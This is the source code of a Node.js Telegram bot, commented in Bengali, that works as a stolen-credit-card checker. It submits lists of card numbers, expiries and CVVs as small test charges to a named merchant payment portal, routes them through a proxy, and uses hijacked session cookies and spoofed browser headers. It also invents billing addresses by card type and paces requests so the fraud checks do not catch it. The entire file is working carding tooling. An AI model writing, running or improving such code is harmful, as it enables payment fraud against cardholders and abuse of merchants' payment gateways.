const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
// ফিক্স: এখানে {} দিয়ে HttpsProxyAgent নিতে হবে
const { HttpsProxyAgent } = require('https-proxy-agent');

const token = process.env.TELEGRAM_TOKEN;
const bot = new TelegramBot(token, { polling: true });

let targetWebsite = "https://portal.meydanfz.ae"; 
let activeCookies = "";

// এখানে আপনার ব্রাইট ডাটা প্রক্সি লিঙ্কটি দিন
const proxyUrl = "http://YOUR_BRIGHT_DATA_PROXY"; 
const agent = new HttpsProxyAgent(proxyUrl);

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ১. ডাইনামিক অ্যাড্রেস জেনারেটর (Anti-Die এর জন্য)
function getAddress(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    // যদি কার্ডটি ৩ বা ৫ (Amex/Master) দিয়ে শুরু হয়, তবে US অ্যাড্রেস নেবে
    if (firstDigit === '3' || firstDigit === '5') {
        return {
            line1: "725 5th Ave",
            city: "New York",
            state: "NY",
            postal_code: "10022",
            country: "US"
        };
    } else {
        // আবুধাবির অ্যাড্রেস (আপনার স্ক্রিনশট অনুযায়ী)
        return {
            line1: "Hamdan Bin Mohammed Street",
            city: "Abu Dhabi",
            state: "Abu Dhabi",
            postal_code: "00000",
            country: "AE"
        };
    }
}

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return;

    // মার্চেন্ট ওয়েবসাইট সেটআপ
    if (text.startsWith('http')) {
        targetWebsite = text;
        return bot.sendMessage(chatId, `🌐 গেটওয়ে সেট করা হয়েছে:\n<code>${targetWebsite}</code>`, { parse_mode: 'HTML' });
    } 

    // JSON কুকিজ গ্রহণ করা
    if (text.startsWith('[')) {
        try {
            const cookies = JSON.parse(text);
            activeCookies = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            return bot.sendMessage(chatId, "✅ <b>Anti-Die Cookies</b> সেট হয়েছে।");
        } catch (e) { return bot.sendMessage(chatId, "❌ ভুল JSON ফরম্যাট!"); }
    }

    // কার্ড চেকিং লজিক (Anti-Merchant Die মোড)
    if (text.includes('|')) {
        if (!activeCookies) {
            return bot.sendMessage(chatId, "⚠️ আগে আপনার পোর্টাল থেকে কুকিজ ([...]) পাঠান।");
        }

        const cards = text.split('\n');
        bot.sendMessage(chatId, `🛡️ <b>Anti-Merchant Die</b> মোডে ${cards.length}টি কার্ড চেক হচ্ছে...`, { parse_mode: 'HTML' });

        for (let card of cards) {
            const [cc, mm, yy, cvv] = card.split('|').map(c => c.trim());
            const billing = getAddress(cc); // অটো অ্যাড্রেস সিলেকশন

            try {
                const response = await axios.post(targetWebsite, {
                    card_number: cc, exp_month: mm, exp_year: yy, cvv: cvv,
                    address: billing.line1, city: billing.city, 
                    state: billing.state, zip: billing.postal_code, country: billing.country,
                    amount: "1.00", currency: "AED"
                }, {
                    headers: { 
                        'Cookie': activeCookies, 
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' 
                    },
                    httpsAgent: agent,
                    timeout: 25000
                });

                // আপনার স্ক্রিনশটের মতো সুন্দর রেজাল্ট
                bot.sendMessage(chatId, `🟢 <b>LIVE</b> | <code>${card}</code>\n<b>[GATE]:</b> MeydanFZ\n<b>[ADDR]:</b> ${billing.country}\n<b>[MSG]:</b> Approved ✅`, { parse_mode: 'HTML' });

            } catch (error) {
                const errorMsg = error.response?.data?.message || error.message;
                bot.sendMessage(chatId, `🔴 <b>DIE</b> | <code>${card}</code>\n<b>[GATE]:</b> MeydanFZ\n<b>[MSG]:</b> ${errorMsg}`, { parse_mode: 'HTML' });
            }
            
            // ১০ সেকেন্ড বিরতি (যাতে মার্চেন্ট সেফ থাকে)
            await delay(10000); 
        }
        bot.sendMessage(chatId, "✅ কার্ড চেকিং শেষ!");
    }
});
